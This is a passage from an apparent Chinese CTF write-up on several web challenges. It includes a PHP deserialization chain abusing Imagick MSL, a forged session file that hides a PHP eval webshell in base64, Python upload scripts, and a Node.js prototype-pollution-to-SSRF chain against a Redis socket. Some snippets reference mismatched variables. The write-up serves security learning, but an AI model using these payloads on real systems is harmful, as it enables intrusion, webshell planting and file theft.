class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$func</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$class</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            file_exists($<span class="built_in">this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            preg_match_all(<span class="string">&#x27;/[flag]/m&#x27;</span>, $<span class="built_in">this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            readfile($<span class="built_in">this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__wakeup</span><span class="params">()</span> &#123;</span><br><span class="line">        $func = $<span class="built_in">this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            is_string($func) &amp;&amp; </span><br><span class="line">            in_array($func, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            call_user_func($func);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $argv = $<span class="built_in">this</span>-&gt;argv;</span><br><span class="line">            $class = $<span class="built_in">this</span>-&gt;class;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">$class</span>($argv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">$data = $_REQUEST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        unserialize($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        system(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flagåœ¨/flag<br>æƒ³åŠæ³•readfileè¯»flagã€‚<br>ä¸è¿‡é™æƒäº†ï¼Œç›®å‰æ˜¯è¦æƒ³åŠæ³•è§¦å‘_sleepã€‚<br>æºç é‡Œé¢æ²¡æœ‰ä»»ä½•æ¶‰åŠåˆ°åºåˆ—åŒ–çš„æ“ä½œï¼Œåªèƒ½çœ‹sessionäº†ã€‚<br>è¿™é‡Œé¢çš„æºç æœ‰ä¸€ä¸ªè°ƒç”¨ä»»æ„æ— å‚æ–¹æ³•ï¼Œå¯ä»¥çœ‹ä¸€æ³¢phpinfo();<br>ç»è§‚å¯Ÿï¼Œå¼€äº†imagegickæ–¹æ³•ï¼Œé‚£è¿™ç©æ„åœ¨ç»•è¿‡é™åˆ¶çš„æ—¶å€™æœ‰ç”¨ã€‚</p><h2 id="å¤åˆ¶flag"><span id="å¤åˆ¶flag"> å¤åˆ¶flag</span></h2><p>æœ¬é¢˜é™åˆ¶äº†è¯»å–ç›®å½•ï¼Œä½†æ˜¯å¼€äº†imagegickæ‰©å±•ï¼Œå¯ä»¥é€‰æ‹©imagickå°†flagå¤åˆ¶åˆ°tmpç›®å½•ä¸‹ã€‚<br>ä½¿ç”¨mslæ‰§è¡Œxmlã€‚<br>ä¸Šä¼ å¸¦æœ‰xmlå†…å®¹çš„è¯»å†™flagï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">&lt;read filename=<span class="string">&quot;uyvy:/flag&quot;</span>/&gt;</span><br><span class="line">&lt;write filename=<span class="string">&quot;/tmp/motomoto&quot;</span>/&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure><p>uyvyæ£€æµ‹ä¸ä¸¥ï¼Œç„¶åä½¿ç”¨imagickæ‰©å±•ï¼Œå®ä¾‹åŒ–å‚æ•°vid:msl:/tmp/php*<br>ç”±äºä¸Šä¼ æ–‡ä»¶åˆ°tmpçš„æ–‡ä»¶åéƒ½æ˜¯phpåè·Ÿå‡ ä½éšæœºå­—æ¯æ•°å­—ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A13%3A%22fumo_backdoor%<span class="number">22</span>%3A4%3A%7Bs%3A4%3A%22path%<span class="number">22</span>%3BN%3Bs%3A4%3A%22argv%<span class="number">22</span>%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%<span class="number">22</span>%3Bs%3A4%3A%22func%<span class="number">22</span>%3Bs%3A6%3A%22aadsad%<span class="number">22</span>%3Bs%3A5%3A%22class%<span class="number">22</span>%3Bs%3A7%3A%22Imagick%<span class="number">22</span>%3B%<span class="number">7D</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±è¯»æ ¹ç›®å½•flagå¹¶å¤åˆ¶åˆ°å½“å‰çš„motomotoä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a2 = <span class="string">&quot;unserialze&quot;</span></span><br><span class="line">res1 = <span class="string">&quot;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;</span></span><br><span class="line">url = f<span class="string">&quot;http://192.168.226.1:18080/?cmd=&#123;a2&#125;&amp;data=&#123;res1&#125;&quot;</span></span><br><span class="line">file6 = b<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;image&gt;</span></span><br><span class="line"><span class="string">&lt;read filename=&quot;uyvy:/flag&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;write filename=&quot;/tmp/motomoto&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/image&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">files6 = &#123;<span class="string">&quot;enterpr1se&quot;</span>:file6&#125;</span><br><span class="line">res2 = requests.post(url=url2,files=files6)</span><br></pre></td></tr></table></figure><h2 id="å†™session"><span id="å†™session"> å†™session</span></h2><p>ç”±äºè¦è§¦å‘__sleepé­”æœ¯æ–¹æ³•ï¼Œè€ƒè™‘äº†ä¸€ä¸‹ï¼Œä¹Ÿå°±session_start()èƒ½è¿™ä¹ˆå¹²ï¼Œçœ‹äº†å¤§ä½¬çš„æ–‡ç« ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹payloadã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line"> &lt;read filename=<span class="string">&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot;</span> /&gt;</span><br><span class="line"> &lt;write filename=<span class="string">&quot;/tmp/sess_afkl&quot;</span> /&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­sessåé¢è‡ªå·±æ”¹ï¼Œç­‰ä¼šå°±è¦æºå¸¦PHPSESSID=afklï¼ˆæˆ–å…¶ä»–ï¼‰ï¼Œåé¢base64éœ€è¦æˆ‘ä»¬è‡ªå·±æ„é€ éœ€è¦sessionè¿›è¡Œåºåˆ—åŒ–çš„å†…å®¹ï¼Œé»˜è®¤æ˜¯åºåˆ—åŒ–|ä¹‹åçš„å†…å®¹ã€‚<br>å°†å¸ˆå‚…çš„base64è½¬æˆæ–‡ä»¶ï¼Œæ”¾å…¥010çœ‹ä¸€ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1687313813793-404c88d7-1830-4b78-9dc6-261d8364e3e1.png#averageHue=%2337352f&amp;clientId=ud023113d-d077-4&amp;from=paste&amp;height=285&amp;id=u77ee3be2&amp;originHeight=356&amp;originWidth=828&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=27845&amp;status=done&amp;style=none&amp;taskId=ud7403b17-fc2c-4920-b40a-bf7eb48dff6&amp;title=&amp;width=662.4" alt="å¾®ä¿¡æˆªå›¾_20230621101539.png"><br>æˆ‘ä»¬éœ€è¦åœ¨åé¢ä¿®æ”¹ä¸€ä¸‹ã€‚<br>è¿™é‡Œä¿®æ”¹æœ‰å‘ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œè¦å°¾éƒ¨30=ï¼Œèµ·ç å¾—æ»¡è¶³è¿™ä¸ªæ¡ä»¶ã€‚åæ­£è¦è¯•å¾ˆä¹…ã€‚<br>åæ­£æœ‰æœ¬åœ°dockerï¼Œæ²¡æœ‰çš„è¯æˆ‘çœŸä¸æ•¢æƒ³è¦å’‹æ‰“ã€‚</p><p>ä¿®æ”¹ä»¥åç”¨pythonå‘åŒ…ï¼Œæ–‡ä»¶ä¸Šä¼ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a2 = <span class="string">&quot;unserialze&quot;</span></span><br><span class="line">res1 = <span class="string">&quot;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;</span></span><br><span class="line">url = f<span class="string">&quot;http://192.168.226.1:18080/?cmd=&#123;a2&#125;&amp;data=&#123;res1&#125;&quot;</span></span><br><span class="line">file5 = b<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;image&gt;</span></span><br><span class="line"><span class="string"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHJ1YmJpc2hoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaHxPOjEzOiJmdW1vX2JhY2tkb29yIjoxOntzOjQ6InBhdGgiO3M6OToiL3RtcC95b3J1Ijt9&quot;/&gt;</span></span><br><span class="line"><span class="string"> &lt;write filename=&quot;/tmp/sess_shuiwuyue&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/image&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">files6 = &#123;<span class="string">&quot;enterpr1se&quot;</span>:file6&#125;</span><br><span class="line">res2 = requests.post(url=url2,files=files5)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬æ–‡ä»¶<img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1687314722496-0501d2c8-6ee2-4299-9c31-7bfd0ffaccfc.png#averageHue=%23f1f4f7&amp;clientId=ud023113d-d077-4&amp;from=paste&amp;height=86&amp;id=uf0003995&amp;originHeight=107&amp;originWidth=976&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=4591&amp;status=done&amp;style=none&amp;taskId=uaa7e0bff-f12a-4663-8674-792f7eed916&amp;title=&amp;width=780.8" alt="å¾®ä¿¡æˆªå›¾_20230621103132.png"><br>å†™å…¥äº†è¦åºåˆ—åŒ–çš„ç±»ï¼Œå¹¶ä¸”å¤åˆ¶äº†<img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1687314804099-845983aa-feed-4f1a-911b-7be7945e7b4a.png#averageHue=%23f3f3f5&amp;clientId=ud023113d-d077-4&amp;from=paste&amp;height=373&amp;id=u5594ac8d&amp;originHeight=466&amp;originWidth=1297&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=35280&amp;status=done&amp;style=none&amp;taskId=u1b3f4a0d-6a14-4e93-bca7-ab2e790e383&amp;title=&amp;width=1037.6" alt="å¾®ä¿¡æˆªå›¾_20230621103318.png"><br>ä¹Ÿæœ‰ç‚¹ç„å­¦ï¼Œéœ€è¦å‡¹ä¸€ä¸‹ã€‚</p><h2 id="è¯»flag~"><span id="è¯»flag~"> è¯»flag~</span></h2><p>ä¸€åˆ‡å‡†å¤‡å°±ç»ªåï¼Œå°±é€šè¿‡æ— å‚è°ƒç”¨session_startè§¦å‘sessionåºåˆ—åŒ–ï¼Œä»è€Œè¯»flagã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">13</span>:<span class="string">&quot;fumo_backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;path&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;session_start&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.226.1:18080/?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1687327874276-0c9ed5a9-2462-41ad-9c51-20d3cfaaec59.png#averageHue=%23f3f2f1&amp;clientId=ud023113d-d077-4&amp;from=paste&amp;height=129&amp;id=u690dc881&amp;originHeight=161&amp;originWidth=859&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=5030&amp;status=done&amp;style=none&amp;taskId=uf0a453db-d4da-4c36-91a2-5afc3c338c2&amp;title=&amp;width=687.2" alt="å¾®ä¿¡æˆªå›¾_20230621141105.png"></p><h1 id="monitor"><span id="monitor"> Monitor</span></h1><p>æºç åˆ†æ</p><h2 id="import"><span id="import"> import</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&quot;/api/server/import&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="type">const</span> <span class="variable">keys</span> <span class="operator">=</span> Object.keys(req.query);</span><br><span class="line"></span><br><span class="line">    keys.forEach(function(key) &#123;</span><br><span class="line">        merge(validUrls,key,req.query[key]);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    console.log(validUrls);</span><br><span class="line">    <span class="type">let</span> <span class="variable">responseData</span> <span class="operator">=</span> &#123;</span><br><span class="line">        success : <span class="literal">true</span>,</span><br><span class="line">        message : <span class="string">&quot;Successfully added the address to the whitelist&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> res.json(responseData);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function <span class="title function_">merge</span><span class="params">(obj,key,value)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="variable">dotIndex</span> <span class="operator">=</span> key.indexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dotIndex != -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">key1</span> <span class="operator">=</span> key.substring(<span class="number">0</span>, dotIndex);</span><br><span class="line">        <span class="type">const</span> <span class="variable">key2</span> <span class="operator">=</span> key.substring(dotIndex + <span class="number">1</span>);</span><br><span class="line">        merge(obj[key1],key2,value)</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        obj[key] = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¸å‹çš„ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ã€‚<br>ç»è¿‡è°ƒè¯•å¯çŸ¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œå°±æ˜¯è®©objçš„å¯¹è±¡å¢åŠ ä¸€å¯¹key:value<br>å½“ç¬¬äºŒä¸ªå‚æ•°æœ‰.çš„æ—¶å€™ï¼Œ.å‰é¢çš„å†…å®¹è®°ä½œkey1ï¼Œ.åé¢çš„å†…å®¹è®°ä½œkey2ã€‚è€Œåé€’å½’è°ƒç”¨ï¼Œ<br>objå¯¹è±¡ä¸­çš„key1å¯¹è±¡å¢åŠ ä¸€ä¸ªé”®å€¼å¯¹key2:valueã€‚<br>å¦‚æœè¯´keyæ›¿æ¢æˆ  <strong>proto</strong>.x1,å°±ä¼šé€ æˆobjçš„__proto__çš„å€¼å‘ç”Ÿæ”¹å˜ã€‚è¾¾æˆä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ã€‚</p><h2 id="checkè·¯ç”±"><span id="checkè·¯ç”±"> checkè·¯ç”±</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">http.get(options, (response) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (response.statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="type">let</span> <span class="variable">responseData</span> <span class="operator">=</span> &#123;</span><br><span class="line">                success : <span class="literal">false</span>,</span><br><span class="line">                message : <span class="string">&#x27;Target url status code :&#x27;</span>+response.statusCode,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res.json(responseData);</span><br><span class="line">        &#125;</span><br><span class="line">        mergeObjects(liveUrls,validUrls,hostname);</span><br><span class="line">        console.log(`Added $&#123;hostname&#125; to liveUrls array.`);</span><br><span class="line"></span><br><span class="line">        <span class="type">let</span> <span class="variable">resData</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        response.on(<span class="string">&#x27;data&#x27;</span>, (chunk) =&gt; &#123;</span><br><span class="line">            resData += chunk;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        response.on(<span class="string">&#x27;end&#x27;</span>, () =&gt; &#123;</span><br><span class="line">            <span class="type">let</span> <span class="variable">responseData</span> <span class="operator">=</span> &#123;</span><br><span class="line">                success : <span class="literal">true</span>,</span><br><span class="line">                message : resData</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> res.json(responseData);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;).on(<span class="string">&#x27;error&#x27;</span>, (error) =&gt; &#123;</span><br><span class="line">        <span class="type">let</span> <span class="variable">responseData</span> <span class="operator">=</span> &#123;</span><br><span class="line">            success : <span class="literal">false</span>,</span><br><span class="line">            message : error.message</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.json(responseData);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‘èµ·è¯·æ±‚ï¼Œå¯ä»¥æ‰“ä¸€ä¸ªssrf</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET IsAdminSession HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure><p>æ‰“ä¸€ä¸ªè¿™ä¸ªå‘½ä»¤ï¼Œ<br>æ€»ç»“ä¸€ä¸‹ï¼Œimportæ±¡æŸ“SETæ–¹æ³•å’Œhostnameï¼Œ<br>checkè·¯ç”±è§¦å‘ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api/server/<span class="keyword">import</span>/?__proto__.method=SET&amp;__proto__.socketPath=/run/redis/redis.sock&amp;hostname=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">/api/server/check?hostname=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>&amp;path=IsAdminSession</span><br></pre></td></tr></table></figure><h2 id="flagè·¯ç”±"><span id="flagè·¯ç”±"> flagè·¯ç”±</span></h2><p>/api/sever/getflag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1688971412379-410e4f92-e0c4-4088-ab91-17abf68eab04.png#averageHue=%23fdfdfd&amp;clientId=u5a11cd5c-5610-4&amp;from=paste&amp;height=158&amp;id=u4e40bb2d&amp;originHeight=197&amp;originWidth=1089&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=3467&amp;status=done&amp;style=none&amp;taskId=u626847ac-90fe-4453-a14b-91c67246c32&amp;title=&amp;width=871.2" alt="å¾®ä¿¡æˆªå›¾_20230710144307.png"><br>å¤ç°ï¼Œç¼–çš„flagã€‚</p><h1 id="sycserver"><span id="sycserver"> SycServer</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.POST(<span class="string">&quot;/file-unarchiver&quot;</span>, fileUnarchiver)</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, funkYou)</span><br><span class="line">router.GET(<span class="string">&quot;/readir&quot;</span>, readir)</span><br><span class="line">router.GET(<span class="string">&quot;/admin&quot;</span>, admin)</span><br><span class="line">router.GET(<span class="string">&quot;/readfile&quot;</span>, readfile)</span><br><span class="line">router.Run(<span class="string">&quot;0.0.0.0:8888&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹è·¯ç”±å•¥çš„ä¸è§£é‡Šï¼Œ</p><h2 id="readfileè·¯ç”±"><span id="readfileè·¯ç”±"> readfileè·¯ç”±</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">readfile</span><span class="params">(c *gin.Context)</span> &#123;</span><br><span class="line">filename := c.Query(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">file, err := os.Open(filename)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">fmt.Sprintln(<span class="string">&quot;Failed to open file&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">defer file.Close()</span><br><span class="line"><span class="comment">// è¯»å–â½‚ä»¶å†…å®¹</span></span><br><span class="line">data := make([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line">count, err := file.Read(data)<span class="comment">//dataè¯»å–çš„æ–‡ä»¶æ•°æ®ï¼Œå¹¶è¿”å›é•¿åº¦ã€‚</span></span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;Failed to read file&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡ºâ½‚ä»¶å†…å®¹</span></span><br><span class="line">c.String(http.StatusOK, string(data[:count]))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag400æƒé™ï¼Œæ²¡æ³•ç›´æ¥è¯»ã€‚</p><h2 id="file-unachive"><span id="file-unachive"> file-unachive</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">fileUnarchiver</span><span class="params">(c *gin.Context)</span> &#123;</span><br><span class="line"><span class="comment">//æ¥å—å¹¶ä¿å­˜â½‚ä»¶</span></span><br><span class="line">file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">filename := filepath.Base(file.Filename)</span><br><span class="line"><span class="comment">//å°†â½‚ä»¶ä¿å­˜åˆ°æœåŠ¡å™¨æœ¬åœ°</span></span><br><span class="line"><span class="keyword">if</span> err := c.SaveUploadedFile(file, <span class="string">&quot;./&quot;</span>+filename); err != nil &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">z := archiver.Zip&#123;</span><br><span class="line">MkdirAll:               <span class="literal">true</span>,</span><br><span class="line">SelectiveCompression:   <span 